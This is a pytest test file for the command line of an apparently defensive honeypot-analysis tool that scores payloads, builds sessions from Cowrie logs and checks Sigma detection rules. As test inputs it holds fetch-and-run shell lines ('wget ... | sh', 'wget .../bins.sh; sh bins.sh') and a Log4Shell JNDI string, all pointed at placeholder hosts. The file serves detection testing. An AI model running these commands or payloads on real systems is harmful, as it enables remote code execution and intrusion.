"""Command line parsing and dispatch."""

from __future__ import annotations

import json
from datetime import timedelta

import pytest

from deception_shield.cli import build_parser, main, parse_duration


class TestDurationParsing:
    @pytest.mark.parametrize(
        ("text", "expected"),
        [
            ("30s", timedelta(seconds=30)),
            ("15m", timedelta(minutes=15)),
            ("24h", timedelta(hours=24)),
            ("7d", timedelta(days=7)),
            ("2w", timedelta(weeks=2)),
            ("  12H  ", timedelta(hours=12)),
        ],
    )
    def test_valid_durations(self, text: str, expected: timedelta) -> None:
        assert parse_duration(text) == expected

    @pytest.mark.parametrize("text", ["", "h", "10", "10y", "abc", "-5m"])
    def test_invalid_durations_are_rejected(self, text: str) -> None:
        with pytest.raises(Exception):
            parse_duration(text)


class TestParser:
    def test_replay_requires_a_capture(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args(["replay"])

    def test_replay_accepts_several_captures(self) -> None:
        args = build_parser().parse_args(["replay", "a.pcap", "b.pcap"])
        assert args.capture == ["a.pcap", "b.pcap"]

    def test_analyze_is_an_alias_for_analyse(self) -> None:
        assert build_parser().parse_args(["analyze"]).command == "analyze"

    def test_format_defaults_to_markdown(self) -> None:
        assert build_parser().parse_args(["replay", "a.pcap"]).format == "markdown"

    def test_score_sources_are_mutually_exclusive(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args(["score", "--text", "x", "--file", "y"])

    def test_a_command_is_required(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args([])


class TestScoreCommand:
    def test_reports_a_malicious_payload(self, capsys) -> None:
        assert main(["score", "--text", "wget http://x/m.sh | sh"]) == 0
        out = capsys.readouterr().out
        assert "likely-malicious" in out
        assert "shell_pipe_execution" in out

    def test_reports_a_benign_payload(self, capsys) -> None:
        assert main(["score", "--text", "GET /index.html"]) == 0
        assert "benign" in capsys.readouterr().out

    def test_reads_a_file(self, tmp_path, capsys) -> None:
        target = tmp_path / "payload.bin"
        target.write_bytes(b"${jndi:ldap://x/y}")
        assert main(["score", "--file", str(target)]) == 0
        assert "log4shell" in capsys.readouterr().out


class TestReplayCommand:
    def test_missing_capture_exits_nonzero(self, capsys) -> None:
        assert main(["replay", "/nonexistent/x.pcap"]) == 2
        assert "no such capture" in capsys.readouterr().err

    def test_empty_directory_exits_nonzero(self, tmp_path, capsys) -> None:
        assert main(["replay", str(tmp_path)]) == 2
        assert "no captures matched" in capsys.readouterr().err


def cowrie_log(path, commands, session="a1b2c3d4e5f6", day="2026-09-20"):
    events = [
        {
            "eventid": "cowrie.session.connect",
            "session": session,
            "timestamp": f"{day}T12:00:00.000001Z",
            "src_ip": "203.0.113.7",
            "protocol": "ssh",
            "sensor": "sensor-0",
        },
        {
            "eventid": "cowrie.login.success",
            "session": session,
            "timestamp": f"{day}T12:00:01.000001Z",
            "src_ip": "203.0.113.7",
            "username": "root",
            "password": "admin",
            "sensor": "sensor-0",
        },
    ]
    events += [
        {
            "eventid": "cowrie.command.input",
            "session": session,
            "timestamp": f"{day}T12:00:0{2 + i}.000001Z",
            "src_ip": "203.0.113.7",
            "input": command,
            "sensor": "sensor-0",
        }
        for i, command in enumerate(commands)
    ]
    events.append(
        {
            "eventid": "cowrie.session.closed",
            "session": session,
            "timestamp": f"{day}T12:00:09.000001Z",
            "src_ip": "203.0.113.7",
            "sensor": "sensor-0",
        }
    )
    path.write_text("".join(json.dumps(e) + "\n" for e in events), encoding="utf-8")
    return path


class TestDetectionCommandParsing:
    @pytest.mark.parametrize(
        "argv",
        [
            ["sessions", "build", "logs/", "-o", "out.jsonl"],
            ["sessions", "import-history", "h", "--host", "laptop", "-o", "out.jsonl"],
            ["sessions", "stats", "a.jsonl", "--format", "json"],
            ["label", "a.jsonl", "--labels", "l.csv", "--all", "benign"],
            ["rules", "check"],
            ["rules", "test", "--step-summary"],
            ["detect", "a.jsonl"],
            ["evaluate", "a.jsonl", "b.jsonl", "--labels", "l.csv", "--holdout", "2026-W40"],
            ["fixtures", "export", "a.jsonl", "--labels", "l.csv", "--holdout", "2026-W40"],
        ],
    )
    def test_commands_parse(self, argv) -> None:
        assert build_parser().parse_args(argv).func is not None

    def test_evaluate_requires_a_window(self) -> None:
        with pytest.raises(SystemExit):
            build_parser().parse_args(["evaluate", "a.jsonl", "--labels", "l.csv"])


class TestSessionCommands:
    def test_build_from_logs(self, tmp_path, capsys) -> None:
        log = cowrie_log(
            tmp_path / "cowrie.json", ["uname -a", "cd /tmp; wget http://203.0.113.4/x"]
        )
        out = tmp_path / "corpus.jsonl"
        assert main(["sessions", "build", str(log), "-o", str(out)]) == 0
        assert "wrote 1 command sessions" in capsys.readouterr().err
        assert main(["sessions", "stats", str(out)]) == 0
        assert "**1 command sessions**" in capsys.readouterr().out

    def test_build_needs_exactly_one_source(self, tmp_path, capsys) -> None:
        assert main(["sessions", "build", "-o", str(tmp_path / "x.jsonl")]) == 2
        assert (
            main(["sessions", "build", str(tmp_path), "--elasticsearch", "http://x", "-o", "x"])
            == 2
        )

    def test_import_history_appends(self, tmp_path, capsys) -> None:
        history = tmp_path / "bash_history"
        history.write_text("#1790000000\nls\n#1790090000\ndf -h\n", encoding="utf-8")
        out = tmp_path / "benign.jsonl"
        assert (
            main(["sessions", "import-history", str(history), "--host", "laptop", "-o", str(out)])
            == 0
        )
        other = tmp_path / "zsh_history"
        other.write_text(": 1790200000:0;git status\n", encoding="utf-8")
        args = [
            "sessions",
            "import-history",
            str(other),
            "--host",
            "server",
            "--append",
            "-o",
            str(out),
        ]
        assert main(args) == 0
        assert len(out.read_text().splitlines()) == 3

    def test_import_history_without_timestamps_is_refused(self, tmp_path, capsys) -> None:
        history = tmp_path / "bash_history"
        history.write_text("ls\n", encoding="utf-8")
        args = [
            "sessions",
            "import-history",
            str(history),
            "--host",
            "x",
            "-o",
            str(tmp_path / "o.jsonl"),
        ]
        assert main(args) == 2
        assert "HISTTIMEFORMAT" in capsys.readouterr().err


class TestRuleCommands:
    def test_the_shipped_rules_check_clean(self, capsys) -> None:
        assert main(["rules", "check"]) == 0
        assert "12 Sigma rules across 6 ATT&CK techniques" in capsys.readouterr().out

    def test_a_rule_that_would_not_convert_faithfully_fails(self, tmp_path, capsys) -> None:
        rules = tmp_path / "rules"
        rules.mkdir()
        (rules / "r.yml").write_text(
            "title: r\nid: 33333333-3333-4333-8333-333333333333\nstatus: test\nlevel: low\n"
            "tags: [attack.t1105]\nlogsource: {product: cowrie}\n"
            "detection:\n  sel:\n    input|re: '.*wget\\s.*'\n  condition: sel\n",
            encoding="utf-8",
        )
        assert main(["rules", "check", "--rules", str(rules)]) == 1
        assert "no Lucene equivalent" in capsys.readouterr().out

    def test_the_shipped_gate_passes(self, capsys) -> None:
        assert main(["rules", "test"]) == 0
        assert "# Detection gate passed" in capsys.readouterr().out

    def test_a_failing_gate_exits_non_zero_and_writes_the_summary(
        self, tmp_path, capsys, monkeypatch
    ) -> None:
        fixtures = tmp_path / "fixtures"
        fixtures.mkdir()
        summary = tmp_path / "summary.md"
        monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
        assert main(["rules", "test", "--fixtures", str(fixtures), "--step-summary"]) == 1
        assert "# Detection gate failed" in summary.read_text()


class TestMeasurementCommands:
    @pytest.fixture
    def corpus(self, tmp_path):
        out = tmp_path / "corpus.jsonl"
        logs = tmp_path / "logs"
        logs.mkdir()
        cowrie_log(
            logs / "cowrie.json.1",
            ["cd /tmp; wget http://203.0.113.4/bins.sh; sh bins.sh"],
            "aaaa",
            "2026-09-22",
        )
        cowrie_log(logs / "cowrie.json.2", ["uname -s -v -n -r -m"], "bbbb", "2026-09-29")
        cowrie_log(logs / "cowrie.json.3", ["nproc"], "cccc", "2026-09-30")
        assert main(["sessions", "build", str(logs), "-o", str(out)]) == 0
        labels = tmp_path / "labels.csv"
        assert main(["label", str(out), "--labels", str(labels), "--all", "attack"]) == 0
        return out, labels

    def test_detect(self, corpus, capsys) -> None:
        out, _ = corpus
        assert main(["detect", str(out), "--format", "json"]) == 0
        report = json.loads(capsys.readouterr().out)
        assert report["sessions"] == 3 and report["alerted"] == 2

    def test_detect_as_a_report(self, corpus, capsys) -> None:
        out, _ = corpus
        assert main(["detect", str(out)]) == 0
        report = capsys.readouterr().out
        assert "**2 of 3 sessions** raised at least one alert" in report
        assert "| `sensor-0/aaaa` |" in report and "File Download From A Bare IP Address" in report

    def test_evaluate(self, corpus, capsys) -> None:
        out, labels = corpus
        assert main(["evaluate", str(out), "--labels", str(labels), "--holdout", "2026-W40"]) == 0
        assert "Detected **1 of 2** labelled attack sessions" in capsys.readouterr().out

    def test_evaluate_rejects_an_unreadable_window(self, corpus, capsys) -> None:
        out, labels = corpus
        assert main(["evaluate", str(out), "--labels", str(labels), "--holdout", "soon"]) == 2

    def test_fixture_export_keeps_the_held_out_week_out(self, corpus, tmp_path, capsys) -> None:
        out, labels = corpus
        assert main(["fixtures", "export", str(out), "--labels", str(labels)]) == 2
        target = tmp_path / "fixtures"
        args = [
            "fixtures",
            "export",
            str(out),
            "--labels",
            str(labels),
            "--holdout",
            "2026-W40",
            "--fixtures",
            str(target),
        ]
        assert main(args) == 0
        exported = [
            json.loads(line)
            for line in (target / "attack" / "captured.jsonl").read_text().splitlines()
        ]
        assert [f["id"] for f in exported] == ["sensor-0/aaaa"]
        assert "203.0.113.4" in exported[0]["commands"][0]["c"]  # documentation range, kept as is
